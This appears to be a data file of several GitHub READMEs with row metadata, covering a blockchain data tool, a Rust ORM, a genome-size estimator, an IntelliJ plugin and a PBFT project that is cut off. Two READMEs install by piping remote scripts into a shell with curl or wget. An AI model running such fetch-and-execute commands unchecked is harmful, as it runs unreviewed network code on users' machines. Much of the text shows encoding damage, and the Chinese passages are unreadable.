- **Interoperability**: With the booming development of blockchain technology, it‚Äôs becoming increasingly difficult for different blockchains to understand and process each other‚Äôs data. Manuscript can solve the interoperability problem of multi-chain and off-chain data aggregation in any dimension. By providing unified interfaces and data processing methods, Manuscript enables seamless integration of data from different blockchains, greatly improving the development efficiency and feasibility of cross-chain applications.

- **Monetization**: Leveraging the data capabilities provided by Manuscript, combined with the dual-chain architecture CometBFT + DPoS high-performance instant transaction finality and proof-of-stake consensus features, Chainbase offers a fair and transparent data value exchange ecosystem. Creators can monetize their processed data through Manuscript, while data users can conveniently consume the data they need. This mechanism not only incentivizes the production of high-quality data but also promotes the positive development of the entire blockchain ecosystem.

## ‚ú® Videos

<https://github.com/user-attachments/assets/80dfb1c2-3a4e-4e85-bd2b-12d5ca0b5639>

<https://github.com/user-attachments/assets/7ac316a8-ffc1-4381-a268-7f07292ad200>

## Getting Started üèÑ
### Install Manuscript Client
> ‚ö†Ô∏è **Note**: The manuscript data is only being trialed on the testnet and locally. Please do not use it in a production environment.
```shell
# GUI
curl -fsSL  https://github.com/chainbase-labs/manuscript-core/raw/main/install-gui.sh | bash

# CLI
curl -fsSL  https://github.com/chainbase-labs/manuscript-core/raw/main/install.sh | bash
```
### GUI
![manuscript-gui](./images/manuscript-gui.png)

### Requirements
[Docker Desktop 25.1+](https://www.docker.com/products/docker-desktop/)

### Example

Here's an example of how to <b>process</b> data from chainbase with manuscript:

#### 1. After installing `manuscript-cli`, you can initialize the Manuscript scripts and environment using the command
```bash
‚ûú  manuscript-cli --help
Chainbase Manuscript ‚Ñ¢ Build The World\'s Largest Omnichain Data Network üöÄ üöÄ üöÄ
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
Usage:
  manuscript-cli [command] [flags]

Available Commands:
  init     Initialize and start local manuscript containers
  list     List all manuscript jobs
  logs     View logs of a manuscript job
  stop     Stop a manuscript job
  deploy   Deploy Manuscript to a local environment or the Chainbase network.
```
#### 2. **manuscript-cli init**: Use the client to initialize the `manuscript.yaml` file for a local standalone container environment
```bash
‚ûú  manuscript-cli init
üèÇ 1. Enter your manuscript name: (default is demo)
7...
6: Polygon_zkEVM (Database: zkevm)
5: Avalanche (Database: avalanche)
4: Base (Database: base)
3: Arbitrum_One (Database: arb1)
2: Bsc (Database: bsc)
1: Ethereum (Database: ethereum)
üèÇ 1.Enter your chain choice (default is zkevm):

üß≤ 2.Please select a table from the list below:
1: blocks
2: transactionLogs
3: transactions
Enter your choice (default is blocks):
‚úî No input provided. Defaulting to table: blocks

üìç 3.Please select a data output target:
1: Postgresql
2: Print (output to console)
Enter your choice (default is Postgresql):
‚úî No input provided. Defaulting to output target: postgres

üèÑüèÑ Summary of your selections:
Selected manuscript name: demo
Selected chain: zkevm
Selected table: blocks
Data output target: postgres

üöÄ Do you want to proceed with the above selections? (yes/no): yes
¬∑¬∑¬∑
‚úì Step 5: Start Docker Containers, which was completed successfully!
‚†ô Step 6: Check Container Status Loading... ‚úì Container demo is running
‚úì Step 6: Check Container Status completed successfully!
üéâ Manuscript demo deployment completed successfully!
You can now list your job with the command: 
üëâ manuscript-cli list

If you need to manually edit the manuscript, you can edit the file '/Users/azroa/github/manuscript/demo/manuscript.yaml' and then manually execute the 'deploy' command:
üëâ vim /Users/azroa/github/manuscript/demo/manuscript.yaml
üëâ manuscript-cli deploy /Users/azroa/github/manuscript/demo/manuscript.yaml --env=local
```
#### 3. List the job to check the status of the job
```bash
manuscript-cli list
üü¢ 1: Name: demo | State: RUNNING | Start Time: 2024-10-08 14:26 | Duration: 3 minutes | GraphQL: http://127.0.0.1:8082

manuscript-cli logs demo
¬∑¬∑¬∑logs¬∑¬∑¬∑
```
#### 4. Access the GraphQL endpoint to query the data(GraphQL: http://127.0.0.1:8082)
![graphQL](./images/graphQL.jpg)

#### 5. Deploy the Manuscript to the Local Environment or the Chainbase Network(the network is coming soon...)
```bash
# 1. cat the manuscript_config.ini file
‚ûú  ~ cat $HOME/.manuscript_config.ini
baseDir = /Users/azroa/github

[demo]
name = demo
¬∑¬∑¬∑

# 2. vim the manuscript.yaml file
vim ~/github/manuscript/demo/manuscript.yaml

# 3. Deploy the Manuscript to the Local Environment
manuscript-cli deploy ~/github/manuscript/demo/manuscript.yaml --env=local
or
manuscript-cli deploy ~/github/manuscript/demo/manuscript.yaml --env=chainbase
```

### Key Concepts
There are two primary objects:
- `manuscript.yaml` - A script file used to describe the data processing workflow, defining data sources, data processing methods, and the final data flow direction.
- `docker-compose.yaml` - The Docker Compose file defines a local container cluster environment, allowing developers to test locally. After testing, it can be deployed to the Chainbase distributed network.

Under the hood, the `Manuscript` will:
- Start a default stream processing framework, such as a Flink cluster.
- Consume user-defined source data.
- Process these stream data using your defined transforms.
- Sink the processed data to the data source.

## Roadmap üìç

Here are some of the planned improvements:

- [x] Support Chainbase Network Streaming Lakehouse.
- [x] Support Flink application mode.
- [x] Support Schema Registry.
- [ ] Support for user-defined functions (UDFs) for blockchain data parsing, such as decoding contract events and functions
- [ ] Support custom advanced data processing logic with JAVA and Rust APIs.
- [ ] Support local lightweight k8s environment deployment.
- [ ] Support distributed edge node coordinators.
- [ ] Support RPC and substream data processing formats.
- [ ] Support light node authentication.

## Contributors

<!-- readme: contributors -start -->
<table>
	<tbody>
		<tr>
            <td align=""center"">
                <a href=""https://github.com/Liquidwe"">
                    <img src=""https://avatars.githubusercontent.com/u/116100070?v=4"" width=""100;"" alt=""Liquidwe""/>
                    <br />
                    <sub><b>Liquid</b></sub>
                </a>
            </td>
            <td align=""center"">
                <a href=""https://github.com/lxcong"">
                    <img src=""https://avatars.githubusercontent.com/u/8024426?v=4"" width=""100;"" alt=""lxcong""/>
                    <br />
                    <sub><b>lxcong</b></sub>
                </a>
            </td>
            <td align=""center"">
                <a href=""https://github.com/XdpCs"">
                    <img src=""https://avatars.githubusercontent.com/u/72180730?v=4"" width=""100;"" alt=""XdpCs""/>
                    <br />
                    <sub><b>Alan Xu</b></sub>
                </a>
            </td>
            <td align=""center"">
                <a href=""https://github.com/AlanViast"">
                    <img src=""https://avatars.githubusercontent.com/u/9742385?v=4"" width=""100;"" alt=""AlanViast""/>
                    <br />
                    <sub><b>Alan Viast</b></sub>
                </a>
            </td>
            <td align=""center"">
                <a href=""https://github.com/nnsW3"">
                    <img src=""https://avatars.githubusercontent.com/u/146735585?v=4"" width=""100;"" alt=""nnsW3""/>
                    <br />
                    <sub><b>Elias Rad</b></sub>
                </a>
            </td>
            <td align=""center"">
                <a href=""https://github.com/KagemniKarimu"">
                    <img src=""https://avatars.githubusercontent.com/u/82295340?v=4"" width=""100;"" alt=""KagemniKarimu""/>
                    <br />
                    <sub><b>KagemniKarimu</b></sub>
                </a>
            </td>
		</tr>
	<tbody>
</table>
<!-- readme: contributors -end -->

## Get Involved ü§ù

- Please use [GitHub issues](https://github.com/chainbase-labs/manuscript-core/issues) to report bugs and suggest new features.
- Join the [Manuscript Community On Telegram](https://t.me/ChainbaseNetwork), a vibrant group of developers, data engineers and newcomers to blockchain data, who are learning and leveraging Manuscript for real-time data processing.
- Follow us on [X](https://x.com/chainbaseHQ) where we share our latest tutorials, forthcoming community events and the occasional meme.
- If you have any questions or feedback - write to us at support@chainbase.com!

<table>
	<tbody>
		<tr>
            <td align=""center"">
                <a href=""https://discord.gg/chainbase"">
                    <img src=""./images/discord.png"" width=""150;"" alt=""Liquidwe""/>
                    <br />
                </a>
            </td>
            <td align=""center"">
                <a href=""https://t.me/ChainbaseNetwork"">
                    <img src=""./images/telegram.png"" width=""150;"" alt=""Liquidwe""/>
                    <br />
                </a>
            </td>
		</tr>
	<tbody>
</table>

## License üìó

Manuscript-core is licensed under the Apache 2.0 license.  
View a copy of the License file [here](https://github.com/chainbase-labs/manuscript-core/blob/main/LICENSE).
",5,5,2,Apache-2.0,"codespell.yml,contribute.yml,release.yml,test.yml",41.0
tokio-rs/toasty,main,"# Toasty

**Current status: Incubating - Toasty is not ready for production usage. The API
is still evolving and documentation is lacking.**

Toasty is an ORM for the Rust programming language that prioritizes ease-of-use.
It supports both SQL databases as well as some NoSQL databases, including DynamoDB
and Cassandra. Note that Toasty does not hide the database capabilities.
Instead, Toasty exposes features based on the target database.

## Using Toasty

Projects that use toasty create a schema file to define the application's data
model. Here is the schema file from the
[hello-toasty](examples/hello-toasty/schema.toasty) example:

```rust
model User {
    #[key]
    #[auto]
    id: Id,

    name: String,

    #[unique]
    email: String,

    todos: [Todo],

    moto: Option<String>,
}

model Todo {
    #[key]
    #[auto]
    id: Id,

    #[index]
    user_id: Id<User>,

    #[relation(key = user_id, references = id)]
    user: User,

    title: String,
}
```

Using the Toasty CLI tool, you will generate all necessary Rust code for working
with this data model. The generated code for the above schema is
[here](examples/hello-toasty/src/db).

Then, you can easily work with the data model:

```rust
// Create a new user and give them some todos.
let user = User::create()
    .name(""John Doe"")
    .email(""john@example.com"")
    .todo(Todo::create().title(""Make pizza""))
    .todo(Todo::create().title(""Finish Toasty""))
    .todo(Todo::create().title(""Sleep""))
    .exec(&db)
    .await?;

// Load the user from the database
let user = User::find_by_id(&user.id).get(&db).await?

// Load and iterate the user's todos
let mut todos = user.todos().all(&db).await.unwrap();

while let Some(todo) = todos.next().await {
    let todo = todo.unwrap();
    println!(""{:#?}"", todo);
}
```

## SQL and NoSQL

Toasty supports both SQL and NoSQL databases, including Cassandra and DynamoDB.
However, it does not aim to abstract the database. Instead, Toasty leans into
the target database's capabilities and aims to help the user avoid issuing
innefficient queries for that database.

When targetting both SQL and NoSQL databases, Toasty generates query methods
(e.g. `find_by_id` only for access patterns that are indexed). When targetting a
SQL database, Toasty might allow arbitrary additional query constraints. When
targetting a NoSQL database, Toasty will only allow constraints that the
specific target database can execute. For example, with DynamoDB, query methods
might be generated based on the table's primary key, and additional constraints
may be set for the sort key.

## Application data model vs. database schema

Toasty decouples the application datamodel from the database's schema. By
default, a toasty application schema will map 1-1 with a database schema.
However, additional annotations may be specified to customize how the
application data model maps to the database schema.

For example, the [crate-hub](examples/cratehub/schema.toasty) examples shows how
to map multiple application models to a single database table.

```rust
table user_and_packages {
    model User {
        #[key]
        #[auto]
        id: Id,

        name: String,

        #[unique]
        email: String,

        packages: [Package],
    }

    #[key(partition = user_id, local = id)]
    model Package {
        #[relation(key = user_id, references = id)]
        user: User,

        user_id: Id<User>,

        #[auto]
        id: Id,

        name: String,
    }
}
```

## Current status and roadmap

Toasty is still in the early development stages and is considered
**incubating**. There is no commitment to on-going maintenance or development.
At some point in the future, as the project evolves, this may change. As such,
we encourage you to explore, experiment, and contribute to Toasty, but do not
try using it in production.

Immediate next steps for the project are to fill obvious gaps, such as implement
error handling, remove panics throughout the code base, support additional data
types, and write documentation. After that, development will be based on
feedback and contribution.

## License

This project is licensed under the [MIT license].

[MIT license]: LICENSE

### Contribution

Unless you explicitly state otherwise, any contribution intentionally submitted
for inclusion in Tokio by you, shall be licensed as MIT, without any additional
terms or conditions.
",0,3,2,MIT,ci.yml,27.0
mbhall88/lrge,main,"# LRGE

[![check](https://github.com/mbhall88/lrge/actions/workflows/check.yml/badge.svg)](https://github.com/mbhall88/lrge/actions/workflows/check.yml)
[![test](https://github.com/mbhall88/lrge/actions/workflows/test.yml/badge.svg)](https://github.com/mbhall88/lrge/actions/workflows/test.yml)

**L**ong **R**ead-based **G**enome size **E**stimation from overlaps

LRGE (pronounced ""large"") is a command line tool for estimating genome size from long read overlaps. The tool is built 
on top of the [`liblrge`][liblrge] Rust library, which is also available as a standalone library for use in other projects.

> PREPRINT/PAPER COMING SOON

## Table of Contents

- [Installation](#installation)
- [Usage](#usage)
- [Method](#method)
- [Results](#results)
- [Benchmark](#benchmark)
- [Citation](#citation)
 

## Installation

- [Precompiled binary](#precompiled-binary)
- [Conda](#conda)
- [Cargo](#cargo)
- [Container](#container)
  - [Apptainer](#apptainer)
  - [Docker](#docker)
- [Build from source](#build-from-source)

### Precompiled binary

![GitHub Downloads (all assets, all releases)](https://img.shields.io/github/downloads/mbhall88/lrge/total)
![GitHub Release](https://img.shields.io/github/v/release/mbhall88/lrge)



```shell
curl -sSL lrge.mbh.sh | sh
# or with wget
wget -nv -O - lrge.mbh.sh | sh
```

You can also pass options to the script like so

```
$ curl -sSL lrge.mbh.sh | sh -s -- --help
install.sh [option]

Fetch and install the latest version of lrge, if lrge is already
installed it will be updated to the latest version.

Options
        -V, --verbose
                Enable verbose output for the installer

        -f, -y, --force, --yes
                Skip the confirmation prompt during installation

        -p, --platform
                Override the platform identified by the installer [default: apple-darwin]

        -b, --bin-dir
                Override the bin installation directory [default: /usr/local/bin]

        -a, --arch
                Override the architecture identified by the installer [default: aarch64]

        -B, --base-url
                Override the base URL used for downloading releases [default: https://github.com/mbhall88/lrge/releases]

        -h, --help
                Display this help message
```

### Conda

![Conda Version](https://img.shields.io/conda/vn/bioconda/lrge)
![Conda Platform](https://img.shields.io/conda/pn/bioconda/lrge)
![Conda Downloads](https://img.shields.io/conda/dn/bioconda/lrge)

```sh
conda install -c bioconda lrge
```

### Cargo

![Crates.io Version](https://img.shields.io/crates/v/lrge)
![Crates.io Total Downloads](https://img.shields.io/crates/d/lrge)

```sh
cargo install lrge
```

### Container

Docker images are hosted on the GitHub Container registry.

#### Apptainer

Prerequisite: [`apptainer`][apptainer] (previously Singularity)

```shell
$ URI=""docker://ghcr.io/mbhall88/lrge:latest""
$ apptainer exec ""$URI"" lrge --help
```

The above will use the latest version. If you want to specify a version then use a
[tag][ghcr] like so.

```shell
$ VERSION=""0.1.1""
$ URI=""docker://ghcr.io/mbhall88/lrge:${VERSION}""
```

#### Docker

Prerequisite: [`docker`][docker]

```shell
$ docker pull ghcr.io/mbhall88/lrge:latest
$ docker run ghcr.io/mbhall88/lrge:latest lrge --help
```

You can find all the available tags [here][ghcr].

### Build from source

```shell
$ git clone https://github.com/mbhall88/lrge.git
$ cd lrge
$ cargo build --release
$ target/release/lrge -h
```

---

## Usage

Estimate the genome size of a set of *Mycobacterium tuberculosis* ONT [reads](https://www.ebi.ac.uk/ena/browser/view/SRR28370649) 
([true genome size](https://www.ebi.ac.uk/ena/browser/view/CP149484): 4.40 Mbp / 4405449 bp).

```
$ wget -O reads.fq.gz ""ftp://ftp.sra.ebi.ac.uk/vol1/fastq/SRR283/049/SRR28370649/SRR28370649_1.fastq.gz""
$ lrge -t 8 reads.fq.gz
[2024-11-22T03:49:53Z INFO  lrge] Running two-set strategy with 10000 target reads and 5000 query reads
[2024-11-22T03:50:10Z INFO  lrge] Estimated genome size: 4.43 Mbp (IQR: 3.16 Mbp - 4.99 Mbp)
4426642
[2024-11-22T03:50:10Z INFO  lrge] Done!
```

The size estimate is printed to stdout, but you can also save it to a file with the `-o` flag.

```
$ lrge -t 8 reads.fq.gz -o size.txt
[2024-11-22T03:49:53Z INFO  lrge] Running two-set strategy with 10000 target reads and 5000 query reads
[2024-11-22T03:50:10Z INFO  lrge] Estimated genome size: 4.43 Mbp (IQR: 3.16 Mbp - 4.99 Mbp)
[2024-11-22T03:50:10Z INFO  lrge] Done!
$ cat size.txt
4426642
```

By default, LRGE uses the [two-set strategy](#two-set-strategy) with 10,000 target reads (`-T`) and 5,000 query reads 
(`-Q`). You can use the [all-vs-all strategy](#all-vs-all-strategy) by specifying the number of reads to use with the `-n` flag.

### Library

You can also use the `liblrge` library in your Rust projects. This allows you to estimate genome size within your own 
applications - without needing to call out to `lrge`. For more details on how to use the library, see the [documentation](https://www.docs.rs/liblrge) or the 
[source code](./liblrge).

### Standard options

```
$ lrge -h
Genome size estimation from long read overlaps

Usage: lrge [OPTIONS] <INPUT>

Arguments:
  <INPUT>  Input FASTQ file

Options:
  -o, --output <OUTPUT>      Output file for the estimate [default: -]
  -T, --target <INT>         Target number of reads to use (for two-set strategy; default) [default: 10000]
  -Q, --query <INT>          Query number of reads to use (for two-set strategy; default) [default: 5000]
  -n, --num <INT>            Number of reads to use (for all-vs-all strategy)
  -P, --platform <PLATFORM>  Sequencing platform of the reads [default: ont] [possible values: ont, pb]
  -t, --threads <INT>        Number of threads to use [default: 1]
  -C, --keep-temp            Don't clean up temporary files
  -D, --temp <DIR>           Temporary directory for storing intermediate files
  -s, --seed <INT>           Random seed to use - making the estimate repeatable
  -q, --quiet...             `-q` only show errors and warnings. `-qq` only show errors. `-qqq` shows nothing
  -v, --verbose...           `-v` show debug output. `-vv` show trace output
  -h, --help                 Print help (see more with '--help')
  -V, --version              Print version
```

### Full usage

Estimate genome size of PacBio reads

```
$ lrge -P pb -t 8 reads.fq
```

Don't remove the intermidiate read and overlap files

```
$ lrge -C reads.fq
```

Use the [all-vs-all strategy](#all-vs-all-strategy) with 10,000 reads

```
$ lrge -n 10000 reads.fq
```

Fix the seed so that subsequent runs return the same size estimate

```
$ lrge -s 123 reads.fq
```

By default, we take the median of the *finite* estimates to get the final genome size estimate. If you want to include 
infinite estimates in the calculation

```
$ lrge -8 reads.fq
```

If you don't want the estimate to be rounded to the nearest integer ü§ì

```
$ lrge --float-my-boat reads.fq
```

In [the paper][doi], we suggest using the 15th and 65th percentiles of the estimates to get a ~92% confidence interval. 
However, you can change these

```
$ lrge --q1 0.25 --q3 0.75 reads.fq
```

If you want to see the estimate for each read, turn on trace level logging

```
$ lrge -vv reads.fq
```

By default, the intermediate files are stored in a temporary directory. You can specify a different temporary 
directory

```
$ lrge -D ./mytemp/ reads.fq
```

---

```
$ lrge --help
Genome size estimation from long read overlaps

Usage: lrge [OPTIONS] <INPUT>

Arguments:
  <INPUT>
          Input FASTQ file

Options:
  -o, --output <OUTPUT>
          Output file for the estimate

          [default: -]

  -T, --target <INT>
          Target number of reads to use (for two-set strategy; default)

          [default: 10000]
  -Q, --query <INT>
          Query number of reads to use (for two-set strategy; default)

          [default: 5000]

  -n, --num <INT>
          Number of reads to use (for all-vs-all strategy)

  -P, --platform <PLATFORM>
          Sequencing platform of the reads

          [default: ont]
          [possible values: ont, pb]

  -t, --threads <INT>
          Number of threads to use

          [default: 1]

  -C, --keep-temp
          Don't clean up temporary files

  -D, --temp <DIR>
          Temporary directory for storing intermediate files

  -s, --seed <INT>
          Random seed to use - making the estimate repeatable

  -8, --inf
          Take the estimate as the median of all estimates, *including infinite estimates*

  -f, --float-my-boat
          I neeeeeed that precision! Output the estimate as a floating point number

      --q1 <FLOAT>
          The lower quantile to use for the estimate

          [default: 0.15]

      --q3 <FLOAT>
          The upper quantile to use for the estimate

          [default: 0.65]

  -q, --quiet...
          `-q` only show errors and warnings. `-qq` only show errors. `-qqq` shows nothing

  -v, --verbose...
          `-v` show debug output. `-vv` show trace output

  -h, --help
          Print help (see a summary with '-h')

  -V, --version
          Print version
```


## Method

For a full description of the method, see the [paper][doi].

### Two-set strategy

The two-set strategy is the default method used by LRGE. It involves randomly selecting a two distinct subsets of reads 
from the input. One subset is deemed the target set ($T$) and the other the query set ($Q$). Each read $`q_i`$ in $Q$ is overlapped 
against $T$ and a genome size ($\textbf{GS}$) estimate is generated for that read ($`\textbf{GS}_{T,q_i}`$). The estimate is calculated based on 
the number of overlaps of $`q_i`$ with reads in $T$ ($`O_{T,q_i}`$), according to the formula:

```math
\textbf{GS}_{T,q_i} \approx \frac{\vert T \vert \cdot \vert q_i \vert + \overline{t \in T} - 2 \cdot \textbf{OT}}{O_{T,q_i}}
```

where $\vert T \vert$ is the total size of the target set, $\vert q_i \vert$ is the length of read $q_i$, $\overline{t \in T}$ is 
the average length of reads in $T$, and $\textbf{OT}$ is the overlap threshold (minimum chain score in minimap2, which 
defaults to 100 for overlaps). See [the paper][doi] for more formal/rigorous definitions.

Ultimately, the genome size estimate is the median of the finite estimates for each read in $Q$.

We use this strategy as the default as it is the most computationally efficient and the accuracy is comparable to the 
all-vs-all strategy. We suggest a smaller number of query reads than target reads, as this will speed things up and as 
we take the median of the estimates, the number of query reads (over a certain point) should not affect the accuracy of 
the estimate all that much.

### All-vs-all strategy

The all-vs-all strategy involves overlapping some random subset (`-n`) of reads in the input against each other. The 
genome size estimate for each read is calculated as above, but we subtract one from $\vert T \vert$ to account for the fact 
that the read is not being overlapped against itself. We also do not factor the length of the read whose size is being 
estimated into the average read length calculation.

This strategy is *generally* more computationally expensive than the two-set strategy, but it can be more accurate. Though 
we did not find the difference to be statistically significant in our tests.

## Results

We compared LRGE to three other methods: GenomeScope2, Mash, and Raven ([see below](#alternatives) for more info). We ran 
each method on 3370 read sets from PacBio or ONT data. Each of these samples is associated with a RefSeq assembly, so the 
true size was taken as the size of the RefSeq assembly. You can find the metadata for the samples [here](./paper/config/bacteria_lr_runs.filtered.tsv).

The full results are available in the [paper][doi] and [here](./paper/results/estimates/estimates.tsv). Here is a brief summary of how LRGE compares to other methods.

![Results](./paper/results/figures/method_absolute_relative_error.png)

This compares the absolute relative error as a percentage. The relative error ($\epsilon_{\text{rel}}$) is calculated as:

```math
    \epsilon_{\text{rel}} = \frac{\hat{G} - G}{G} \cdot 100
```

where $G$ is the true genome size, and $\hat{G}$ is the estimated genome size. For example, a $\epsilon_{\text{rel}}$ of 50% 
is out (higher or lower) by 50% of the true genome size. So if the true genome size is 1 Mbp, a $\epsilon_{\text{rel}}$ of 50% 
would be 1.5 Mbp or 0.5 Mbp. 

The following figure shows the (non-absolute) relative error for the same methods to give an 
indication of which methods tend to over or underestimate.

![Results](./paper/results/figures/platform_relative_error.png)


## Benchmark

For the full details of the methods benchmarked, see the [paper][doi]. However, here is a brief summary of the results.

![Benchmark](./paper/results/figures/method_cpu_memory.png)

The statistical annotations above the violins are coloured by the method which has the lowest mean value for the given 
metric.

## Alternatives

The methods we compare against are:

[GenomeScope2](https://github.com/tbenavi1/genomescope2.0): to get estimates from GenomeScope2, you need to first generate 
a k-mer spectrum. We used [KMC](https://github.com/refresh-bio/KMC) for this. You can find a Python script that takes reads 
and generates a k-mer spectrum in [`genomescope.py`](./paper/workflow/scripts/genomescope.py). The list of parameters used 
can also be found in the [workflow config](./paper/config/config.yaml).

[Mash](https://github.com/marbl/Mash): we used `mash sketch` on the reads, which prints out the estimated genome size in 
the logging output. You can find the options used in the [workflow config](./paper/config/config.yaml).

[Raven](https://github.com/lbcb-sci/raven): Raven essentially just assembles the reads - *REALLLLY* fast üöÄ

You can find the full details of how we compared methods in the [workflow](./paper/workflow/rules/estimate.smk).

## Citation

If you use LRGE in your research, please cite the following paper:

```bibtex
COMING SOON
```

[apptainer]: https://github.com/apptainer/apptainer
[docker]: https://docs.docker.com/
[doi]: https://doi.org/TODO
[ghcr]: https://github.com/mbhall88/lrge/pkgs/container/lrge
[liblrge]: https://www.docs.rs/liblrge
[quay.io]: https://quay.io/repository/mbhall88/lrge",2,0,2,MIT,"check.yml,docker.yml,release.yml,scheduled.yml,test.yml",0.0
lyflexi/feignx-plugin,main,"<div align=""center"">
  <img src=""./feignx/src/main/resources/META-INF/pluginIcon.svg"" height=""64"">
  <h2>FeignX</h2>
</div>

Â∑≤‰∏äÊû∂ideaÊèí‰ª∂Â∏ÇÂú∫Ôºöhttps://plugins.jetbrains.com , ÊêúÁ¥¢FeignX‰∏ãËΩΩÂÆâË£Ö

---
<div align=""center"">
  <img src=""./feignx/pics/ReadmeMarketplace.png"">
  <p>Marketplace</p>
</div>


FeignX is inspired by IDEA's star plugin MybatisX. 

The FeignX plugin monitors all FeignClient and ApiController in the project based on real-time scanning mechanism, and provides method-level navigation jump capability. 

In short, You can flexibly jump back and forth between FeignClient and remote service ApiController through method-level navigation buttons.

eg. feignClient -> ApiController
<div align=""left"">
  <img src=""./feignx/pics/f2c.png"">
</div>

eg. ApiController -> feignClient
<div align=""left"">
  <img src=""./feignx/pics/c2f.png"">
</div>


ËßâÂæóÂ•ΩÁî®ÔºåÁÇπ‰∏™star‚≠ê

### Feignx:v1.0.0
cross-moduleÔºöFeignClient-ApiController Mutually Navigation

cross-moduleÔºöApiController-FeignClient Mutually Navigation

### Feignx:v2.1.0
Adapted To Latest IDEA

### Feignx:v3.0.0

[fix]üêû Major version fix , fix the bug that cannot dynamically detect new interfaces due to cache

### Feignx:v3.1.0
Design a unique logo

### Feignx:v4.0.0
adapted properties/yml/yaml of 1.server.servlet.context-path and 2.spring.mvc.servlet.path
![DispatcherServlet.png](feignx/pics/DispatcherServlet.png)

Âú® Spring Boot Âá∫Áé∞‰πãÂâçÔºåDispatcher Servlet ÊòØÂú® web.xml Êñá‰ª∂‰∏≠Â£∞ÊòéÁöÑÔºåÂ¶Ç‰∏ãÂõæ
```xml
<web-app>
   <servlet>
         <servlet-name>example</servlet-name> 
        <servlet class> 
             org.springframework.web.servlet.DispatcherServlet 
        </servlet-class> 
        <load-on-startup>1</load -on-startup> 
    </servlet>
   <servlet-mapping>
        <servlet-name>test</servlet-name> 
        <url-pattern>*.test</url-pattern> 
   </servlet-mapping>
 </web-app>
```

Ëøô‰∏™DispatcherServletÊòØÂÆûÈôÖÁöÑServletÔºåÂÆÉÁªßÊâøËá™Âü∫Á±ªHttpServlet„ÄÇ

Âú® Spring Boot Âá∫Áé∞‰πãÂêéÔºåspring-boot-starter-web starter Ëá™Âä®Ë£ÖÈÖçÊú∫Âà∂Â∞ÜDispatcherServletÈªòËÆ§ÈÖçÁΩÆ‰∏∫ URL Ê®°Âºè‚Äú/‚Äù„ÄÇ

‰ΩÜÊòØÔºåÂ¶ÇÊûúÈúÄË¶ÅÔºåÊàë‰ª¨ÂèØ‰ª•‰ΩøÁî®Ëá™ÂÆö‰πâ URL Ê®°Âºè„ÄÇapplication.propertiesÊñá‰ª∂‰∏≠Â¶Ç‰∏ã
```properties
server.servlet.context-path=/hello
spring.mvc.servlet.path=/world
```

ÈÄöËøá‰∏äÈù¢ÁöÑÈÖçÁΩÆÔºåDispatcherServletË¢´ÈÖçÁΩÆ‰∏∫Â§ÑÁêÜ URL Ê®°Âºè/worldÔºåÂπ∂‰∏îspringbootÊ†π‰∏ä‰∏ãÊñáË∑ØÂæÑÂ∞ÜÊòØ/hello„ÄÇÂõ†Ê≠§ÔºåDispatcherServletÁõëÂê¨http://ip/port/hello/worldÔºåÔºåas prefix path by @FeignClientÔºåthe sample is below
```java
@FeignClient(path = ""/hello/world"",value = ""cloud-feign-server"", contextId = ""user"", configuration = UserConfiguration.class)
public interface UserClient {

    @GetMapping(value = ""/user/get/{id}"")
    User getUserById(@PathVariable(""id"") Long id);
}
```


yml/yamlÈÖçÁΩÆÂêå‰∏ä„ÄÇ

### Feignx:v4.0.1
Êõ¥Êç¢‰∫ÜiconÂíålogo

![feignxAction.png](feignx/src/main/resources/icons/feignxAction.png)
### Feignx:v4.1.1

feignxÈÄÇÈÖç‰∫ÜÊúÄÊñ∞ÁâàIDEAÁöÑLight‰∏ªÈ¢òÔºåÊ¨¢ËøéÂú®IDEAÂÜÖÂú®Á∫øÊõ¥Êñ∞Ëá≥4.1.1ÁâàÊú¨Ôºà‰∏âÂ§©Âêé‰∏äÁ∫øÔºâÔºåÊàñËÄÖÊèêÂâçÂÆâË£ÖÁ¶ªÁ∫øÁâà‰ΩìÈ™åÔºÅ
https://github.com/lyflexi/feignx-plugin/releases/tag/v4.1.1

![img_1.png](img_1.png)

ÊÑüË∞¢ÂÆòÊñπÂ∑•‰Ωú‰∫∫ÂëòÁöÑÊåáÂºïÔºöNatalia Melnikova (JetBrains Marketplace) marketplace@jetbrains.com

ÊÑüË∞¢Á§æÂå∫ÁöÑÂ∏ÆÂä©‰∏éÊèêÁ§∫Ôºöhttps://intellij-support.jetbrains.com/hc/en-us/community/posts/22814305825042-Why-don-t-pluginIcon-svg-appear-in-Light-theme?page=1#community_comment_22848980293394

ÊÑüË∞¢@yann CebronÔºöhttps://intellij-support.jetbrains.com/hc/en-us/profiles/1283051161-Yann-Cebron

--- 
So, install the Latest FeignX plugin as soon as possible!.

ÂÖÑÂºü‰ª¨Ôºå‚ûïstar‚≠ê! ‚ûïstar‚≠ê!

",7,0,1,Apache-2.0,,0.0
0xjeffro/pbft-rust,main,"# pbft-rust ü¶Ä
This project provides a Rust-based implementation of the 
Practical Byzantine Fault Tolerance (PBFT) consensus algorithm, 
inspired by the original paper by Miguel Castro and Barbara Liskov, 
‚ÄúPractical Byzantine Fault Tolerance‚Äù.

The implementation simulates a distributed environment with multiple threads 
representing both clients and consensus nodes (servers). 
Clients initiate transaction requests to the consensus nodes, which then reach agreement using the PBFT algorithm and return the result to the client.


**Key assumptions in this implementation:**
- The client listens on port 9000 by default.
- Consensus nodes listen on ports starting from 8000 and increment by one for each additional node.
- Faulty nodes are modeled by not responding to any requests during the consensus process, simulating a node failure.

**Project Structure:**
```
src/
‚îú‚îÄ‚îÄ main.rs              # Main entry point
‚îú‚îÄ‚îÄ lib.rs               # Library module
‚îú‚îÄ‚îÄ consensus/           # Consensus-related code
‚îÇ   ‚îú‚îÄ‚îÄ message.rs       # Message structures
